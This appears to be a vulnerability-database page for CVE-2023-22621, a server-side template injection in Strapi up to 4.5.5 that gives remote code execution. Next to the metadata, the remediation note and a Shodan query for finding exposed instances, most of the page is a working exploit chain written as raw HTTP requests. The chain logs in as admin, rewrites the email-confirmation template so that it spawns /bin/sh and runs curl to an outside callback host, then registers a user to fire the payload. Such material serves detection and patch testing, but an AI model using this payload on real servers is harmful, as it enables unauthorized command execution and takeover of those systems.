---
layout: post
cve_id: CVE-2023-22621
title: Strapi Versions <=4.5.5 - SSTI to Remote Code Execution
pcap: true
pcap_path: /pcaps/2023/CVE-2023-22621.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-22621.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: high
impact: 'Authenticated attackers with admin panel access can inject malicious template
  code in email templates that bypasses validation checks, executing arbitrary system
  commands on the Strapi server and potentially compromising the entire CMS platform.

  '
remediation: 'Update Strapi to version 4.5.6 or later that implements proper template
  validation and prevents code execution in email templates.

  '
reference:
- https://github.com/strapi/strapi/releases
- https://github.com/sofianeelhor/CVE-2023-22621-POC
- https://github.com/strapi/security-patches
- https://github.com/ARPSyndicate/cvemon
- https://nvd.nist.gov/vuln/detail/CVE-2023-22621
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 7.2
  cve-id: CVE-2023-22621
  cwe-id: CWE-74
  epss-score: 0.82899
  epss-percentile: 0.99221
  cpe: cpe:2.3:a:strapi:strapi:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 4
  vendor: strapi
  product: strapi
  shodan-query: html:"Welcome to your Strapi app"
tags:
- cve
- cve2023
- strapi
- ssti
- rce
- intrusive
- authenticated
- vuln
---

## ðŸ” Vulnerability Description
Strapi through 4.5.5 allows authenticated Server-Side Template Injection (SSTI) that can be exploited to execute arbitrary code on the server. A remote attacker with access to the Strapi admin panel can inject a crafted payload that executes code on the server into an email template that bypasses the validation checks that should prevent code execution.


## ðŸŒ HTTP Request
```nohighlight
POST /admin/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.2 Safari/605.1.15
Connection: close
Content-Length: 50
Content-Type: application/json
Accept-Encoding: gzip

{"email":"BweRbH@MDNkC.com","password":"l2vv25oV"}
```

```nohighlight
PUT /users-permissions/advanced HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; WOW64; rv:41.0) Gecko/20100101 Firefox/140.0 (x64 de)
Connection: close
Content-Length: 165
Authorization: Bearer nER96y
Content-Type: application/json
Accept-Encoding: gzip

{"unique_email":true,"allow_register":true,"email_confirmation":true,"email_reset_password":null,"email_confirmation_redirection":"/","default_role":"authenticated"}
```

```nohighlight
PUT /users-permissions/email-templates HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.7.20) Gecko/ Firefox/3.6.20
Connection: close
Content-Length: 1282
Authorization: Bearer nER96y
Content-Type: application/json
Accept-Encoding: gzip

{
  "email-templates": {
    "reset_password": {
      "display": "Email.template.reset_password",
      "icon": "sync",
      "options": {
        "from": {
          "name": "Administration Panel",
          "email": "no-reply@strapi.io"
        },
        "response_email": "",
        "object": "Reset password",
        "message": "<p>We heard that you lost your password. Sorry about that!</p>\n\n<p>But dont worry! You can use the following link to reset your password:</p>\n<p><%= URL %>?code=<%= TOKEN %></p>\n\n<p>Thanks.</p>"
      }
    },
    "email_confirmation": {
      "display": "Email.template.email_confirmation",
      "icon": "check-square",
      "options": {
        "from": {
          "name": "Administration Panel",
          "email": "no-reply@strapi.io"
        },
        "response_email": "",
        "object": "Account confirmation",
        "message": "<%= `${ process.binding('spawn_sync').spawn({\"file\":\"/bin/sh\",\"args\":[\"/bin/sh\",\"-c\",\"curl d5ir2i1le0o3536nmr50o8gdxzxjuysfd.oast.fun\"],\"stdio\":[{\"readable\":1,\"writable\":1,\"type\":\"pipe\"},{\"readable\":1,\"writable\":1,\"type\":\"pipe\"/*<>%=*/}]}).output }` %>\n\n<p><%= URL %>?confirmation=<%= CODE %></p>\n\n<p>Thanks.</p>"
      }
    }
  }
}
```

```nohighlight
POST /api/auth/local/register HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.6
Connection: close
Content-Length: 154
Content-Type: application/json
Accept-Encoding: gzip

{
    "email": "38BTwDdnawMuv32ibhv2JkVmuDy@EdPsK.com",
    "username": "38BTwHjsi1miB1t9FD79fk2EixO",
    "password": "38BTwHK2t4WHQtVuIWh7xl6SViZ"
}
```

